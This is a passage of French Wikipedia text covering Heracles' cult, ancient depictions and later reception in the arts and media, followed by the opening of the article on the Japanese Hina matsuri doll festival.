Lorsque Rome dans le troisième tiers du quatrième siècle émet ses premières monnaies, Hercule, en dépit de son nom grec, figure sur le quadrans. Au début du siècle, le premier lectisterne collectif l'associe à Diane déjà assimilée à la déesse grecque Artémis.
En Gaule.
En Gaule, Héraclès a connu une très grande popularité chez les Celtes romanisés. Plus de trois cents sculptures le représentent, un grand nombre de statuettes en bronze, plus de cent inscriptions lui sont consacrées. Cet engouement est favorisé par le mythe des Hespérides. Selon Parthénios de Nicée, de l'union d'Héraclès et de Celtinée naît un fils, Celtos, de qui les Celtes ont pris leur nom. Lucien de Samosate, dans une "prolalia" (un avant-propos) intitulée "Héraclès", évoque un dieu de l'éloquence honoré par les Gaulois qu'il présente sous le nom d'Héraclès Ogmios et rapproche du dieu gaulois Ogmios.
Durant la période gallo-romaine, les provinces gauloises adoptent la figure de l’Hercule romain. C’est le cas, par exemple, de la baie de Douarnenez où des statuettes d’Hercule ont été retrouvées dans les cuves de garum, cette préparation à base de poisson très appréciée à Rome. Le dieu joue ici un rôle de protecteur des marchands. Bien que le culte du dieu soit arrivé jusqu’à l’Armorique, il est probable que ces statues, dont l’une d’elles est conservée au musée de Bretagne à Rennes, aient en réalité été fabriquées en Italie puis importées.
Héraclès dans les arts pendant l'Antiquité.
Littérature.
Aucune œuvre littéraire retraçant l'ensemble des aventures d'Héraclès ne nous est parvenue. Cependant, nous savons que de telles œuvres ont existé : pendant l'époque archaïque, le poète Pisandre avait composé une "Héraclide" aujourd'hui perdue qui, selon, une épigramme de Théocrite, relatait pour la première fois les exploits du héros en détail ; au tout début de l'époque classique, Panyasis d'Halicarnasse compose à son tour une "Héraclée" ("Heracleia") qui, selon la "Souda", comportait 14 livres pour un ensemble de 9000 vers. Seuls quelques fragments nous en sont parvenus. Quelques évocations d'ensemble résumant les exploits d'Héraclès se trouvent dans les tragédies, au moment de présenter le personnage (au début de "La Folie d'Héraclès" d'Euripide) ou bien au moment de sa mort (dans "Les Trachiniennes" de Sophocle). Un passage de l’"Énéide" de Virgile décrivant un sacrifice à Hercule comprend un rappel de ses nombreux exploits. Beaucoup d'autres œuvres contiennent des allusions à plusieurs épisodes, comme l’"Iliade" et l’"Odyssée". Cependant, la plupart des œuvres de la littérature grecque ancienne ayant trait à Héraclès se concentrent sur un épisode qu'elles développent en détail, de manière très variable selon le genre littéraire auquel elles appartiennent et la perspective particulière adoptée par l'auteur.
À l'époque archaïque, le poète Créophylos de Samos compose une épopée, la "Prise d'Œchalie", évoquant un conflit entre Héraclès et Eurytos, roi d'Œchalie ; seuls quelques vers et plusieurs témoignages indirects nous renseignent sur cette œuvre perdue. L'un des "Hymnes homériques" évoque les exploits puis l'apothéose d'Héraclès. Au , le poète lyrique Pindare cite Héraclès dans plusieurs de ses poèmes ; au début de l’"Olympique" 2 et dans l’"Olympique" 3, il l'évoque comme le fondateur des jeux olympiques.
Dans le théâtre grec antique de l'époque classique, Héraclès fait l'objet (ou apparaît dans) de nombreuses tragédies. Chez Eschyle, il intervient dans "Prométhée enchaîné" pour délivrer Prométhée de son supplice. Sophocle consacre sa tragédie "Les Trachiniennes" à l'épisode de la mort d'Héraclès, et le fait apparaître plus ponctuellement comme "deus ex machina" pour le dénouement de son "Philoctète". Euripide consacre une tragédie à "La Folie d'Héraclès". Euripide fait aussi apparaître Héraclès dans son "Alceste", où il le décrit d'une façon ambiguë, de la même façon que toute la pièce oscille entre tragédie et comédie : Héraclès est un glouton et il donne à Admète des conseils philosophiques d'ivrogne, mais il se comporte en véritable héros et assure le dénouement heureux de la pièce. Héraclès est aussi évoqué dans la comédie, mais aucune comédie grecque parmi celles qui nous sont parvenues ne lui est spécifiquement consacrée. Dans la comédie "Les Oiseaux" d'Aristophane, Héraclès apparaît comme un agent au service des dieux, mais sa gloutonnerie le rend aisément corruptible. Dans une autre comédie d'Aristophane, "Les Grenouilles", le dieu Dionysos décide de se rendre aux Enfers, mais, comme il a peur de ne pas en revenir vivant, il se déguise en Héraclès pour se donner confiance et va demander conseil au héros au début de la pièce.
Les philosophes grecs anciens s'approprient eux aussi le personnage d'Héraclès. Le philosophe présocratique et sophiste Prodicos de Céos écrit ainsi un apologue où il met en scène Héraclès jeune confronté aux discours séducteurs de deux femmes qui ne sont autres que des allégories du vice et de la vertu. Nous connaissons ce texte de manière indirecte, par l'évocation qu'en fait Xénophon dans les "Mémorables". Cet épisode allégorique, souvent appelé « Héraclès à la croisée des chemins », connaît une postérité abondante après l'Antiquité, notamment dans la peinture de la Renaissance.
À l'époque hellénistique, Héraclès apparaît dans la poésie épique et dans la pastorale. Apollonios de Rhodes, dans ses "Argonautiques", lui fait prendre part à l'expédition des Argonautes, qu'il quitte après la disparition de son éromène Hylas. Théocrite consacre une idylle à « Héraclès enfant » où il relate son tout premier exploit au berceau contre les serpents envoyés par Héra ; dans « Hylas », il évoque lui aussi la disparition de l'aimé du héros.
Un papyrus provenant d'Oxyrhynchos, daté du , contient des fragments d'un poème consacré aux travaux d'Héraclès, en l'occurrence le combat contre le lion de Némée. Plusieurs dessins illustrent le texte.
La littérature latine est également impliquée dans le mythe, à travers le philosophe stoïcien Sénèque. Il composa la tragédie "Hercule furieux", inspirée d'Euripide, où il dépeint un Hercule héroïque mais aussi victime de la folie. "Hercule sur l'Œta" est plus marquée par une fin glorieuse en apothéose mais doit probablement être due à un imitateur postérieur à Sénèque.
Arts plastiques.
Héraclès est représenté dans l'Antiquité en homme barbu, dont la tête est souvent recouverte de la peau du lion de Némée. Il tient parfois un skyphos à la main, et est armé de différentes armes, en fonction de la scène représentée : massue, arc, épée, faucille et/ou fronde.
Sculpture.
En sculpture, le cycle des travaux d'Héraclès est représenté dès le milieu du , de manière incomplète, comme sur les métopes de l'Héraion de Sele à Paestum. Les douze travaux figurent au complet sur les métopes du temple de Zeus d'Olympie, au ; sur le temple d'Héphaïstos d'Athènes, à la même période, ils sont mis en lien avec ceux de Thésée et donc diffèrent. Ces travaux figurent aussi sur des œuvres de plus petites tailles, comme un relief votif d'Héraclès et Omphale conservé au Musée archéologique national de Naples.
Plusieurs sculptures représentent Héraclès au repos, dont le Hercule Farnèse, copie romaine du d'après un original grec de Lysippe, dont une autre copie est l'Héraclès d'Anticythère. Au siècle précédent, l'empereur romain Commode s'est plusieurs fois représenté sous les traits d'Hercule.
Céramique.
Plusieurs travaux d'Héraclès figurent sur une amphore du peintre de Kléophradès, datant de ; d'autres travaux sont très fréquemment représentés dans la céramique, comme l'épisode du lion de Némée.
Mosaïques romaines.
Dans les arts romains, Héraclès est régulièrement représenté sur des mosaïques. Au , la Mosaïque des travaux d'Hercule de Liria, qui décorait le sol d'une salle de réception dans un bâtiment romain découvert dans l'actuelle ville de Llíria en Espagne, représente les travaux d'Héraclès.
Monnaies.
Une scène montrant Héraclès en train de tuer le lion de Némée figure sur des monnaies d'Héraclée de Lucanie, au ; à la même période, Alexandre le Grand se fait représenter en Héraclès, couvert de la peau du lion.
Les monnaies romaines du font apparaitre Hercule dans l'idéologie impériale, comme protecteur de Septime Sévère et de Caracalla, puis de Gallien, Postume, Probus et Maximien Hercule. La figure d'Hercule, héros athlétique et protecteur, modèle populaire et vénéré des soldats, est exhaltée sous Postume et Probus dans des séries monétaires représentant ses travaux.
Études et interprétations mythologiques.
Anthropologie historique.
Dans la continuité des analyses de Jean-Pierre Vernant sur la notion de personne dans la religion grecque et des développements de Marie Delcourt, qui consacre quelques pages à Héraclès dans son étude sur les héros, Nicole Loraux insiste sur le fait que la figure d'Héraclès tend à se réduire aux exploits qu'il accumule : Héraclès n'a pas vraiment d'intériorité. « Héraclès n'est pas tragique, parce qu'il n'est pas ambigu, et, pour en faire un héros tragique, il faudra qu'Euripide lui invente quelque chose comme une intériorité » (Nicole Loraux se réfère à la tragédie d'Euripide "La Folie d'Héraclès"). En contrepartie, la « force muette » d'Héraclès devient le moyen d'expression de toutes sortes de discours, en particulier philosophiques, qui en font une figure édifiante de vertu et de sagesse. La comédie tire Héraclès vers l'extrême inverse en le mettant en scène sous les traits d'une brute stupide et gloutonne.
Mythologie comparée.
Le philologue et mythologue autrichien Rudolf Simek a comparé le héros grec Héraclès au dieu germanique Thor/Donar, sur la base des fonctions et des attributs similaires qu'il leur trouve. Tous deux sont des tueurs de monstres et de géants, défenseurs des dieux et des hommes face aux forces du chaos. Thor possède lui aussi une arme puissante, son marteau Mjöllnir. L’"interpretatio romana" associait déjà Thor à Hercule. Dans "La Germanie", Tacite nomme les dieux des Germains, et évoque les sacrifices faits en l'honneur d'Hercule, qui serait alors le dieu Thor. En Germanie romaine, de nombreuses inscriptions sur des monuments ou pièces portent le nom d'Hercule et désignent véritablement l'Hercule germanique, Thor.
Pour Jean Haudry à la suite des travaux de Martin P. Nilsson, la principale particularité d'Héraclès est, par delà le foisonnement des cultes et des légendes, sa conquête de l'immortalité, ce qu'il nomme la conquête de l'Année (Héra). Selon lui, il doit la plupart des légendes illustrant sa force physique à son frère jumeau Iphiclès, tombé dans l'oubli, mais "a contrario" de celui-ci avant la force brutale, il s'illustre par ses exploits civilisateurs et sa volonté. Ses derniers travaux sont une victoire sur la mort et sa fin symbolise une conquête de l'immortalité solaire.
Dans une approche relevant de la mythologie comparée, l'anthropologue syrien Firas Al-Sawah a rapproché les travaux d'Héraclès de l’épopée babylonienne nommée "Épopée de Gilgamesh". Il établit une filiation entre le récit "La Gloire d’Uruk", rédigé dans la Mésopotamie du et le mythe d'Héraclès, "La Gloire d'Héra", évoqué par les épopées attribuées à Homère au En effet, la similitude est frappante entre un Gilgamesh, roi de Uruk, deux tiers dieu et un tiers humain, effectuant une série d’œuvres devant le mener à l’immortalité, et Héraclès, « Gloire d'Héra », moitié dieu et moitié homme, effectuant douze travaux qui le mèneront à son tour à l’immortalité. Cette interprétation reste minoritaire.
Dans les arts après l'Antiquité.
Littérature.
Les auteurs chrétiens des premiers siècles de notre ère, comme Tertullien, Lactance et saint Augustin, font d'Héraclès un modèle de courage ("fortitudo") ; mais ce n'est qu'au que la figure d'Héraclès est pleinement intégrée à la symbolique chrétienne, avec "L'Ovide moralisé", qui fait d'Héraclès un symbole de Jésus ou de Dieu. Au , le "Recueil des histoires de Troie" de Raoul le Fèvre met en scène un Hercule chevaleresque et courtois semblable aux personnages des romans médiévaux.
Au , Pierre de Ronsard reprend la symbolique chrétienne associée à Héraclès pour composer, parmi ses "Hymnes" publiés en 1555, un « Hercule chrétien », qui dénombre les parallèles possibles entre Hercule et Jésus. À la même époque se développent d'autres symboliques associées à Hercule. Un Hercule égyptien, homonyme de l'Héraclès fils d'Alcmène et plus ancien que lui, était évoqué par Hérodote dans son "Enquête". Au , on commence à faire de cet Hercule, dit « Hercule libyen », l'ancêtre des Gaulois, par l'intermédiaire d'un fils, Galatès, qu'il aurait eu avec la fille d'un chef gaulois et qui serait devenu l'éponyme de la Gaule ; cette généalogie s'élabore dans le cadre d'une rivalité politique et culturelle entre pays d'Europe, où elle vise à avantager la France en lui prêtant des origines plus anciennes encore que les Latins et les Grecs.
Un autre Hercule encore, dit « Hercule Gaulois », s'inspire d'un Héraclès homonyme qui apparaît notamment dans l'Antiquité chez Lucien de Samosate sous le nom d'Héraclès Ogmios et est présenté comme un dieu de l'éloquence honoré par les Gaulois : au , cet Hercule est alors représenté doté à la fois des attributs traditionnels d'Héraclès (la peau du lion de Némée et la massue) et d'une série de chaînes partant de sa langue pour s'accrocher aux oreilles d'une foule qui le suit, symbole de son éloquence captivante. Pierre de Ronsard, dans son poème « Hylas » édité dans le septième livre des "Poèmes" en 1569, prête à Hercule l'ensemble de ces caractéristiques d'Hercule « libyen » et d'Hercule « Gaulois ». Joachim du Bellay évoque l'Hercule Gaulois dans la conclusion de la "Défense et illustration de la langue française" en 1549.
Au , le dramaturge Jean de Rotrou évoque la mort et l'apothéose d'Héraclès dans la tragédie "Hercule mourant", créée en 1634 et publiée en 1636.
Dans la seconde moitié du en France, Héraclès est évoqué par les poètes du Parnasse. José-Maria de Heredia compose, dans "Les Trophées" (publiés en 1893), une série de six sonnets intitulée « Hercule et les Centaures ». Les deux premiers sonnets, « Némée » et « Stymphale », sont consacrés à deux des travaux d'Héraclès, le lion de Némée et les oiseaux du lac Stymphale. Le troisième, « Nessus », évoque l'amour du centaure Nessos pour Déjanire. « La Centauresse », où Héraclès n'apparaît pas, décrit le déclin du peuple des centaures, qu'Héraclès pourchasse et massacre dans les deux derniers sonnets, « Centaures et Lapithes » et « Fuite de Centaures ». Dans ces poèmes, Héraclès est souvent décrit comme terrifiant, ce qui lui confère une affinité inattendue avec les monstres qu'il est chargé de détruire. Leconte de Lisle, dans les "Poèmes antiques", évoque Héraclès dans plusieurs poèmes : « Hylas », « L’Enfance d’Hèraklès », « Hèraklès au Taureau », « Hèraklès solaire » (il l'y nomme parfois Héraclès, parfois Hèraklès selon une orthographe archaïsante, et parfois Hercule). Dans la neuvième de ses Études latines (Néère) figurant dans le même recueil, il le désigne par une périphrase : "L'immortel qui naquit de la Vierge Thébaine" (deuxième vers).
Au , Héraclès prend toutes sortes de visages selon les auteurs. L'écrivain français André Dubois La Chartre réécrit ses exploits dans "Le Journal intime d'Hercule" en 1957. Le dramaturge allemand Heiner Müller en fait un personnage comique dans "Herakles 5". L'écrivain français Guy Rachet lui consacre un roman, "Les Douze Travaux d’Hercule".
Peinture.
Héraclès est représenté par de nombreux peintres. Au , Albrecht Dürer représente plusieurs épisodes de ses aventures sur ses gravures et esquisses, dont "Hercule à la croisée des chemins" (vers 1498) inspiré du texte allégorique de Prodicos de Céos. Le peintre allemand Lucas Cranach l'Ancien peint en 1537 un "Hercule et Omphale" dont les personnages portent des vêtements contemporains. Pierre Paul Rubens représente plusieurs de ses exploits, dont "Hercule aux prises avec le lion de Némée" (après 1608, conservé à Bucarest) et "Hercule dans le jardin des Hespérides", vers 1638 (conservé dans la galerie Sabauda à Turin). Le peintre et sculpteur Antonio Pollaiuolo peint "Hercule combattant l'hydre de Lerne" (conservé à la Galerie des Offices de Florence). En Italie, au début du , le Guide peint une série de tableaux formant le cycle des "Travaux d'Hercule". Le Dominiquin peint un "Paysage avec Hercule tirant Cacus de sa caverne" et un "Paysage avec Hercule combattant Achelaüs changé en taureau" vers 1621-1622.
Au début du , le peintre rococo François Lemoyne réalise pour le château de Versailles, entre 1733 et 1736, une "Apothéose d'Hercule" qui donne son nom au salon dit « salon d'Hercule ». L'italien Sebastiano Ricci représente Hercule dans ses relations avec Déjanire dans "Hercule et Déjanire", vers 1702 dans une collection privée. Pour le hall d'Hercule au rez-de-chaussée du Palazzo Fenzi-Marucelli à Florence, il réalise en 1706-1707, "Hercule tue Nessus". Un tableau antérieur, sur le même thème vers 1700, se trouve au Musée des Beaux-Arts de Houston.
Dans les années 1740-1750, en Italie, Pompeo Batoni réalise plusieurs versions d’"Hercule à la croisée des chemins".
Au , Héraclès est présent dans la peinture symboliste. Gustave Moreau peint un "Hercule et l'hydre de Lerne" entre 1869 et 1876. Arnold Böcklin peint "Nessus et Déjanire" puis "Le Sanctuaire d'Hercule" en 1888. Les peintres préraphaélites le représentent également : John William Waterhouse s'inspire de l’"Alceste" d'Euripide pour son "Hercule se bat contre la Mort pour sauver Alceste", peint entre 1869 et 1871.
Au début du , entre 1921 et 1925, le peintre américain John Singer Sargent réalise pour le Musée des beaux-arts de Boston une série de peintures mythologiques parmi lesquelles figure un "Hercule et l'hydre".
En 1989, le peintre Jean-Marie Pierret recouvre le tablier du barrage hydro-électrique du Chevril (appelé aussi barrage de Tignes ; département de la Savoie) d'une fresque de représentant Hercule.
Sculpture.
Comme de nombreux autres mythes grecs, Héraclès fait l'objet de nombreuses œuvres sculptées, en particulier pendant la Renaissance. Au , Antonio Pollaiuolo réalise un groupe en bronze "Hercule et Antée", conservé au Musée national du Bargello à Florence. Au , le sculpteur italien Baccio Bandinelli sculpte un groupe colossal "Hercule et Cacus", placé devant le Palazzo Vecchio à Florence. À la même époque, le sculpteur italien Giambologna réalise un ensemble représentant "Hercule luttant contre le centaure Nessos" ("Ercole con il centauro Nesso"), exposée par la suite à la Loggia dei Lanzi, de même que son "Enlèvement des Sabines". Durant la même période, avant 1560, le sculpteur italien Guglielmo della Porta réalise un "Hercule tue les serpents" représentant Héraclès enfant tuant l'un des serpents d'Héra, tandis que des saynètes sur le socle de la sculpture représentent ses futurs douze travaux. En France, en 1660, Pierre Puget sculpte un "Hercule terrassant l'hydre de Lerne" (dit "Hercule de Vaudreuil") ; la sculpture, brisée pendant la Révolution, est ensuite reconstituée et conservée au musée de Rouen. Puget sculpte aussi, en 1663, un "Hercule au repos" (également appelé "Hercule Gaulois") conservé au Musée du Louvre.
Au , Laurent Delvaux réalise un "Hercule et le sanglier d'Erymanthe" exposé à la Bibliothèque royale de Belgique. Au , en 1815, Antonio Canova réalise un spectaculaire "Hercule et Lichas" inspiré de l'épisode de la mort de Lichas et conservé à la Galerie d'art moderne de Rome. En 1823, Antoine-Louis Barye sculpte un "Hercule et le sanglier d'Erymanthe" en bronze, conservé au Louvre. Durant la même période, François Joseph Bosio conçoit un ensemble représentant "Hercule combattant Acheloüs transformé en serpent" dont le modèle en plâtre est exposé au Salon de 1814 et dont la sculpture en bronze, achevée en 1822, est conservée au Louvre). Au tout début du , en 1909, le sculpteur français Antoine Bourdelle réalise un "Héraklès archer" d'après l'épisode des oiseaux du lac Stymphale.
Gravure.
En Allemagne, Albrecht Dürer réalise la gravure sur bois en relief vers 1496-1497, "Hercule vainqueur de Cacus" ou "Hercule tuant les Molionides" et une gravure sur cuivre au burin vers 1498-1499, "Hercule à la croisée des chemins" ou "Les Effets de la jalousie."
En France, Augustin Dupré a gravé les pièces de monnaie représentant Hercule (Union et Force) émises pendant la Révolution. Ce type "à l'Hercule" a été repris sous les deuxième, troisième et cinquième républiques. De nouvelles pièces "à l'Hercule", en euros, ont été gravées en 2011 par Joaquin Jimenez.
Musique.
Plusieurs opéras sont consacrés à Héraclès (en général sous son nom latin) à la fin du et dans le courant du . Reinhard Keiser compose un "Hercule et Hébé" ("Die Verbindung des großen Herkules mit der schönen Hebe") créé à Hambourg vers 1700. Christoph Graupner compose un "Hercule et Thésée" créé à Hambourg en 1708. Louis-Nicolas Clérambault compose en 1716 une cantate à voix seule et symphonie, "La mort d'Hercule" et en 171? une autre cantate, "Le triomphe de la vertu ou Hercule vainqueur des plaisirs", opus 29.
Haendel compose un drame musical, "Hercules" (dont le livret est en anglais), qui prend pour sujet la mort d'Héraclès en s'inspirant principalement des "Trachiniennes" de Sophocle. Le drame est créé le 5 janvier 1745 au King's Theatre de Londres.
En France, Camille Saint-Saëns compose en 1877 "La Jeunesse d'Hercule", poème symphonique, op. 50. Claude Terrasse compose un opéra-bouffe en trois actes, "Les Travaux d'Hercule", créé en 1901 au théâtre des Bouffes-Parisiens, dans lequel c'est Augias qui accomplit les exploits d'Hercule, tandis que ce dernier s'en approprie toute la gloire sans rien faire. Dans un tout autre genre, en 1953, Maurice Thiriet compose "Héraklès", une partition chorégraphique pour ballet dramatique.
Bande dessinée.
Héraclès apparaît dans les "comics" américains dans le de "All Star Comics" publié par DC Comics en 1941, qui l'intègre à l'univers DC sous son nom latin Hercule (). En 1965, un numéro de "Journey into Mystery", de Marvel Comics, ajoute à son tour sa vision du personnage d'Hercule à l'univers Marvel. En 2008, l'éditeur Radical Comics lance une autre série consacrée à Hercule avec "Hercules:The Thracian Wars" puis "Hercules: The Knives of Kush".
Dans la bande dessinée européenne, Héraclès est le personnage principal de "La Gloire d'Héra", scénarisée par Serge Le Tendre et dessinée par Christian Rossi (Casterman, 1996). Héraclès apparaît aussi dans chaque tome de la série "Socrate le demi chien" scénarisée par Joann Sfar et dessinée par Christophe Blain (Dargaud, 2002). Les douze travaux d'Héraclès sont racontés par Édouard Cour (scénario et dessin) dans la trilogie "Héraklès", parue entre 2012 et 2015 aux éditions Akileos.
Cinéma.
Héraclès a fait l'objet de nombreux films, en particulier de péplums au . Il n'apparaît qu'assez tard au cinéma par rapport à d'autres héros mythologiques, car il n'est presque pas évoqué par le cinéma muet : seul Febo Mari réalise un "Hercule" ("Ercole") en 1918. C'est dans les années 1950 que le péplum italien commence à mettre en scène le héros, avec les films de Pietro Francisci, comme "Les Travaux d'Hercule" (1958) ou "Hercule et la Reine de Lydie" (1959). Dans les films de Francisci, Héraclès, évoqué sous son nom romain, Hercule, est incarné par Steve Reeves et est décrit comme le héros par excellence, beau, noble et vertueux. Viennent ensuite les films de Vittorio Cottafavi, "La Vengeance d'Hercule" (1960) et "Hercule à la conquête de l'Atlantide" (1961), le second s'orientant nettement vers la science-fiction ; Hercule y est dépeint comme un bon vivant étonnamment pacifique, Cottafavi jouant à subvertir les codes du genre.
Devant le succès du genre et du personnage, Hercule est par la suite utilisé dans les contextes les plus divers : le fantastique avec "Hercule contre les vampires" de Mario Bava et Franco Prosperi (1961), le film d'aventure "pulp" avec "Hercule contre les Fils du soleil" d'Osvaldo Givirami (1964) où Hercule affronte des Incas, la fantasy urbaine avec "Hercule à New York" (Arthur Allan Seidelman, 1970) où Arnold Schwarzenegger fait ses débuts, et de nombreux autres films. Hercule côtoie parfois l'autre héros musclé du péplum italien, Maciste, comme dans "Le Géant de la vallée des rois" (C. Campogalliani, 1960). Héraclès intervient également comme personnage secondaire dans les adaptations de la quête des Argonautes, dont la plus fameuse est "Jason et les Argonautes" de Don Chaffey (1963). En dehors du genre du péplum, le réalisateur allemand Werner Herzog réalise en 1962 un "Herakles", l'un de ses tout premiers films, qui a pour sujet six des douze travaux du héros dans un contexte contemporain.
Le cinéma d'animation, de son côté, s'empare très tôt d'Héraclès : Émile Cohl, l'un des pionniers de l'animation française, réalise un dessin animé en papier découpé, "Les Douze Travaux d'Hercule", en 1910 : le film montre l'ensemble des douze travaux. Beaucoup plus tard, en 1997, c'est au tour des studios Disney de mettre en scène le héros, avec le long-métrage d'animation "Hercule", qui adopte un ton humoristique et un graphisme "cartoon".
Après le renouveau du genre du péplum qui suit le succès de "Gladiator" de Ridley Scott en 2000, Hercule ne tarde pas à revenir sur les écrans. En 2014, deux films américains lui sont consacrés : "La Légende d'Hercule" de Renny Harlin (avec Kellan Lutz dans le rôle principal) puis "Hercule" de Brett Ratner (avec Dwayne Johnson dans le rôle-titre).
Télévision.
La première série télévisée consacrée à Héraclès est une série animée américaine, "Le Puissant Hercule" ("The Mighty Hercules"), conçue par Adventure Cartoon Productions, diffusée sur la chaîne Syndication de 1963 à 1966. Vient ensuite une série en images réelles, "Hercule", créée par Christian Williams et diffusée pour la première fois sur Syndication en 1994 ; conçu au départ comme une suite de cinq téléfilms, le concept est prolongé en une série télévisée qui donne lieu à son tour à plusieurs séries dérivées, dont "Xena, la guerrière" en 1995. En 1998, sort la série d'animation Disney "Hercule".
Héraclès fait aussi l'objet d'une télésuite, "Hercule", réalisée par Roger Young en 2005 pour la télévision américaine. En 2016, l'épisode 18 "Héraclès, l’homme qui devint dieu" de la série "Les Grands Mythes" est centré sur lui.
Jeux vidéo.
En 1984 paraît "Hercules", un jeu vidéo américain de plate-forme développé par Interdisc pour le Commodore 64, dans lequel le joueur incarne Héraclès et doit parcourir douze niveaux parsemés de plates-formes piégées (). En 1987, Smart Egg Software réalise "The Labours of Hercules", une aventure en mode texte programmée par Terry Taylor dans laquelle le joueur incarne Héraclès et doit accomplir les douze travaux. En juin 1987, le studio japonais Data East réalise "Tōjin Makyō-den Heracles no Eikō" ("La Légende du repaire du démon combattant : la gloire d'Héraclès"), un jeu vidéo de rôle pour Famicom. Le jeu connaît plusieurs suites sur différents supports, scénarisées par Kazushige Nojima. En 1988, Gremlin Interactive édite "Hercules: Slayer of the Damned", un jeu de '. En 1997, la sortie du long-métrage d'animation Disney donne lieu à un jeu vidéo dérivé, "Hercule", édité par Disney Interactive. En 2007, le studio français Neko Entertainment édite "Heracles: Chariot Racing", un jeu vidéo de course sur console où le joueur incarne Héraclès participant à des courses de chars dans un univers inspiré de la mythologie grecque. En 2010, le jeu d'action ', met aux prises le héros du jeu, Kratos, avec Héraclès lors d'une séquence de combat.
Astronomie.
En 1935, l'union astronomique internationale a donné le nom d'Hercule à un cratère lunaire.
Imaginaire collectif.
L'imaginaire collectif retient principalement d'Hercule un personnage doté d'une force extrême. La langue française a consacré l'onomastisme nominal "hercule", antonomase lexicalisée qui désigne un homme doté d'une grande force musculaire. De même, l'onomastisme dérivé adjectival "herculéen" désigne ce qui nécessite une très grande force.
Aspects sociétaux.
Les amours d'Héraclès sont dépeintes comme étant bisexuelles (c'est-à-dire qu'elles concernent des hommes et des femmes), ce qui est un trait largement répandu dans les sociétés grecques antiques. Cet aspect du mythe herculéen a par ailleurs été repris comme un symbole, des journaux LGBT comme des associations bisexuelles se l'appropriant.

</doc>
<doc id="1439" url="https://fr.wikipedia.org/wiki?curid=1439" title="Hina matsuri">
Hina matsuri

 est une fête traditionnelle qui a lieu chaque année au Japon le , jour consacré aux petites filles.
Les jours précédant le , les petites filles japonaises exposent de précieuses poupées posées sur des petites estrades à plusieurs niveaux. Ces poupées spéciales, qui se transmettent parfois de génération en génération, sont rangées dans un carton tout le reste de l'année. Elles représentent des personnages de la cour impériale de l'ère Heian.
Origine et tradition.
"Hina matsuri" remonte à l'époque Heian. Elle fait partie des correspondant aux dates du calendrier traditionnel chinois : le premier jour du premier mois, le troisième jour du troisième mois, etc. Après l'adoption du calendrier grégorien par le Japon, les dates de ces fêtes ont été fixées au , au 3 mars, au 5 mai, au 7 juillet et au 9 septembre. La fête a d'abord été appelée car les fleurs de pêchers s'ouvraient à cette période. Ce n'est plus le cas depuis le passage au calendrier grégorien, mais le nom est encore utilisé et les pêches restent un symbole de cette fête.
Historique.
La plus ancienne trace d'utilisation de poupées lors du « festival des pêches » remonte à 1625 avec Oki-ko, la fille de l'empereur Go-Mizunoo. Les dames de la cour impériale lui ont disposé des accessoires pour qu'elle puisse . Après qu'Oki-ko succède à son père sous le nom d'impératrice Meishō, « Hina Matsuri » devient le nom officiel de la fête en 1687. Les fabricants de poupées commencent alors à fabriquer des poupées élaborées pour le festival, certaines faisant jusqu'à un mètre de haut jusqu'à ce que la loi limite leurs tailles. La disposition des poupées ou évolue ensuite pour inclure jusqu'à quinze poupées et leurs accessoires. Les escaliers sont ajoutés pour mettre les poupées les plus chères hors de portée des jeunes enfants.
Pendant l'ère Meiji, le Japon se modernise et le pouvoir politique passe du shogunat au gouvernement de Meiji qui a sa tête l'empereur, même si le rôle politique de ce dernier sera symbolique. Hina matsuri et d'autres fêtes similaires sont alors remplacées par de nouvelles fêtes célébrant le lien entre l'empereur et sa nation, mais la fête est ensuite restaurée : en mettant l'accent sur le mariage et la famille, elle représente les espoirs et les valeurs du Japon, et les poupées étant censées représenter l'empereur, l'impératrice et leur cour, elles symbolisent aussi le respect pour le trône impérial. La fête s'est aussi répandue dans d'autres pays à travers la diaspora japonaise, mais demeure restreinte aux émigrés japonais et à leur descendance.
Tradition.
Le principal aspect du Hina matsuri est l'exposition de poupées, en particulier les deux principales, la et la , qui représentent des mariés de l'ère Heian, mais qui sont plus souvent décrits comme l'empereur et l'impératrice du Japon, généralement sur un tissu rouge. Ce sont souvent des poupées traditionnelles très détaillées, mais à défaut de poupées, on peut représenter un couple en origami ou deux images. Les dispositions plus élaborées se font sur une estrade en avec d'autres poupées représentant des dames de la cour, des musiciens et des serviteurs, avec toutes sortes de vêtements et d'accessoires. L'ensemble des poupées et des accessoires est appelé . Le nombre d'étages et de poupées qu'il contient dépend des familles et de leur budget.
Les familles s'assurent normalement d'avoir au moins les deux poupées principales pour le premier Hina matsuri de leurs filles. Les poupées sont souvent très chères, et peuvent se passer dans les familles de génération en génération. Les éléments du "hinakazari" passent le plus clair de l'année rangés, et les filles et leurs mères commencent à les exposer quelques jours avant le 3 mars (les garçons ne participent généralement pas, la fête du "Tango no sekku" le 5 mai leur étant traditionnellement consacrée). Les poupées doivent être rangées dès le lendemain du Hina matsuri, la superstition voulant que si elles restent trop longtemps en place, la fille de la maison se mariera plus tard, mais certaines familles les laissent en place pendant tout le mois de mars. L'encouragement à ranger rapidement les poupées vient de l'humidité qui règne pendant le mois de mars après la fête et qui pourrait les endommager. Historiquement, les poupées étaient aussi utilisées comme jouets, mais de nos jours il s'agit de poupées de collection uniquement décoratives. Les poupées ne sont généralement plus exposées après le dixième anniversaire de la fille de la maison.
Les poupées étaient supposées protéger des mauvais esprits. Des cérémonies de se tiennent également partout au Japon à cette période, où des poupées de papier ou de paille sont placées sur des barques flottant sur les rivières, afin d'emporter avec elles les péchés et les impuretés. À certains endroits comme le musée des poupées Nagashibina à Tottori, la cérémonie a lieu selon les dates du calendrier luni-solaire traditionnel, plutôt qu'à la date fixe du 3 mars.
Pour célébrer Hina matsuri, on boit traditionnellement du "amazake", du "shirozake" ou du "tôkashu", bières traditionnelles peu ou pas alcoolisées à base de riz, et on mange des "hina arare", biscuits à base de riz et des sushis "chirashi", ainsi que des "sakuramochi" et de la , les coquilles symbolisant un couple uni. Des sucreries sont habituellement placées en offrandes devant l'autel des poupées.
Disposition des poupées.
La disposition des poupées (notamment l'empereur et l'impératrice) à gauche ou à droite dépend des régions et des traditions familiales, mais l'ordre des poupées par étage est le même. L’escalier sur lequel sont disposées les poupées est appelé , il est recouvert d’un tapis de feutre rouge nommé ou simplement . La description qui suit est celle de la disposition la plus complète, comme sur la photographie. Cependant, on peut se contenter d'un ensemble plus simple, avec seulement le couple impérial.
Premier niveau.
